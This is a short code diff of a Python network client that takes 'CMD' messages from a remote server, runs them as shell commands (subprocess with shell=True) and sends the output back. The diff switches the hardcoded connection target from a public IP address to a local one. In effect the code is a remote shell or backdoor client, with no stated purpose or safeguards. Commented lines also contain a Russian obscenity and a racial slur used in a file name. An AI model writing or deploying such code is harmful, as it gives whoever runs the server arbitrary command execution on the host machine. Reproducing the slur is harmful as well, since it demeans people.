@@ -31,7 +31,9 @@ class Client:
 
 					if data.split("|")[0] == "CMD":
 						output, err = subprocess.Popen(data[4:].split(" "), stdout=subprocess.PIPE, shell=True, text=True, stderr=subprocess.PIPE).communicate()
-						self.send(f"CMD{output or (err or ' ')}")
+						if not output and not err:
+							self.send(f"CMD ")
+						self.send(f"CMD{output or err}")
 
 				time.sleep(0.01)
 			except:
@@ -62,8 +64,8 @@ class Client:
 if __name__ == "__main__":
 	# client = Client("26.35.239.192", 7546)
 	# client = Client("26.172.116.184", 7546)
-	client = Client("212.115.110.10", 7546)
-	# client = Client("192.168.1.103", 7546)
+	# client = Client("212.115.110.10", 7546)
+	client = Client("192.168.1.149", 7546)
 	# client.send("хуй")
 	# client.tcp("input_files/negr.jpg")
 	# client.send("get info")
